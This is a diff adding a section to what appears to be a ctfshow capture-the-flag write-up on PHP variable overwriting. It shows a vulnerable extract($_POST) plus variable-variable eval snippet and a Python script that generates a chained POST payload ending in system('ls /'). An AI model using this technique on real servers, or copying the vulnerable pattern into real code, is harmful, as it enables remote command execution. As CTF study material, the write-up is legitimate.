@@ -42,3 +42,23 @@ $ctfshow=$GLOBALS;
 var_dump($ctfshow);
 ```
 
+^
+## **常规变量覆盖**
+```
+error_reporting(0);
+extract($_POST);
+eval($$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$_);
+highlight_file(__FILE__);
+```
+```
+import string
+a='_=a&'
+s=string.ascii_letters
+code="system('ls /');"
+for i in range(35):
+    a+=s[i]+"="+s[i+1]+"&"
+a+=s[i]+"="+code
+print(a)
+
+_=a&a=b&b=......&I=J&J=system('ls /');
+```
